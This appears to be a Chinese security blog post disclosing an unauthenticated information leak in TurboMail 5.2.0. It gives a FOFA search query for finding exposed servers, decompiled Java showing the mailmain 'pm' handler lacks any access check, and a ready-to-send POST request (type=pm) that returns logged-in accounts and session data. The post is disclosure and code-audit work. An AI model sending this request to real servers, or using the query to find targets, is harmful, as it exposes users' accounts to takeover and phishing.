---
title: "TurboMail mailmain 敏感信息泄露漏洞"
source: https://mrxn.net/jswz/turbomail-mailmain-data-leak.html
asset_dir: assets/turbomail-mailmain-敏感信息泄露漏洞
---

# TurboMail mailmain 敏感信息泄露漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/26 08:11
- 862浏览
- [0评论](#comment)
- 27分钟阅读

---

# 漏洞简介

TurboMail邮件系统是广州拓波[软件](#)科技有限公司研发的面向企事业单位通信需求而研发的[电子邮件](#)服务器系统。该系统**mailmain**接口中的**pm**方法存在未授权访问，未授权攻击者可利用该漏洞获取系统用户信息，可能导致进一步的攻击。

# 影响版本

v5.2.0

漏洞预警服务

# fofa语法

> app="TurboMail" || body="maintlogin.jsp" || body="tmw/1/getpassword.jsp"

# 漏洞分析

根据**web.xml**里对**mailmain**的定义

```
<servlet-mapping>
   <servlet-name>mailmaini</servlet-name>
   <url-pattern>/mailmain</url-pattern>          
</servlet-mapping>

<web-app>
       <servlet>
          <servlet-name>mailmaini</servlet-name>
          <servlet-class>turbomail.web.MailMain</servlet-class>
```

跟进**turbomail.web.MailMain**类看下

[![TurboMail mailmain 敏感信息泄露漏洞](images/img-001-d5eddf28c29f.webp)](https://image.mrxn.net/e261240889a841ac853f55a0d54a9029.webp)

标准的Servlet写法，看下本次漏洞点

电子邮件与即时消息

```
long lCurStart = System.currentTimeMillis();
String intertype = request.getParameter("intertype");
if (intertype != null && intertype.equals("ajax")) {
    AjaxMain.service(request, response);
    long lCurEnd = System.currentTimeMillis();
    MailSession ms = WebUtil.getms(request, response);
    String type = request.getParameter("type");
    if (ms != null) {
        KPIMonitor.setWebResponseTime(type, ms.userinfo.getUid(), ms.userinfo.domain, (int)(lCurEnd - lCurStart));
    } else {
        KPIMonitor.setWebResponseTime(type, "", "", (int)(lCurEnd - lCurStart));
    }

} else {
    String type = request.getParameter("type");
    if (type == null) {
        type = "";
    }

    if (type.equals("login")) {
        Login.login(request, response);
    } else if (type.equals("logout")) {
        Logout.doGet(request, response);
    } else if (type.equals("pm")) {
    PMAdmin.show(false, request, response);
    ......
```

当`intertype=ajax`时会进入`AjaxMain.service`，暂时不管，当**type=pm**时，进入`PMAdmin.show`方法

```
public class PMAdmin {
    private static ArrayList alPM = new ArrayList();

    public static void addPM(PMInterface pm) {
        alPM.add(pm);
    }

    public static void show(boolean bAjax, HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        PMInterface pm = null;
        StringBuffer sb = new StringBuffer();

        for(int i = 0; i < alPM.size(); ++i) {
            pm = (PMInterface)alPM.get(i);
            sb.append(pm.PM());
            sb.append("\r\n");
        }

        String str = sb.toString();
        response.getOutputStream().write(str.getBytes(SysConts.New_InCharSet));
    }
}
```

无任何鉴权或者校验，直接将存储的 `PMInterface` 对象遍历进行遍历，调用其 `PM()` 方法，将结果拼接为多行文本。全部循环遍历后输出在响应里，在看下`PM`方法实现逻辑

物流软件安全

[![TurboMail mailmain 敏感信息泄露漏洞](images/img-002-2cee5092badd.webp)](https://image.mrxn.net/a66b303116d9412a9ea96fe0cc51b2f9.webp)

直接获取系统所有的session后输出数量以及对应的key==》邮箱帐号

SessinonAdmin ht\_usersession user:

# 漏洞复现

[![TurboMail mailmain 敏感信息泄露漏洞](images/img-003-72977c1997ce.webp)](https://image.mrxn.net/a9c40025d24e46f7af6473fa66f73105.webp)

```
POST /mailmain HTTP/1.1
Host: turbomail.mrxn.net
Content-Type: application/x-www-form-urlencoded

type=pm
```

成功获取系统已登录用户帐号信息以及session相关信息，攻击者拿到邮箱帐号后就可能进一步攻击如邮箱密码爆破、钓鱼邮件等等。

计算机服务器

[![TurboMail mailmain 敏感信息泄露漏洞](images/img-004-97f6eb5ba19d.webp)](https://image.mrxn.net/9a71a6fa045e456d999b430b3649df7e.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
